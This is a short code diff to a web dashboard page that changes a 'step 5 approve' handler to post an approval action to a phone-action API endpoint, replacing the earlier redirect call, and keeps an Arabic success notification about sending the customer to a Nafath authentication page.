@@ -1000,7 +1000,7 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
-  // Handle step5 approve - redirect to step4
+  // Handle step5 approve - use phone-action endpoint
   const handleStep5Approve = async () => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
@@ -1008,10 +1008,10 @@ export default function DashboardPage() {
     setActionLoading("approve");
     
     try {
-      const res = await fetch("/api/dashboard/redirect", {
+      const res = await fetch("/api/dashboard/phone-action", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, targetPage: "step4" }),
+        body: JSON.stringify({ visitorId, action: "approved" }),
       });
       if (res.ok) {
         showNotification("success", "تم الموافقة ✓ تم توجيه العميل لصفحة النفاذ");
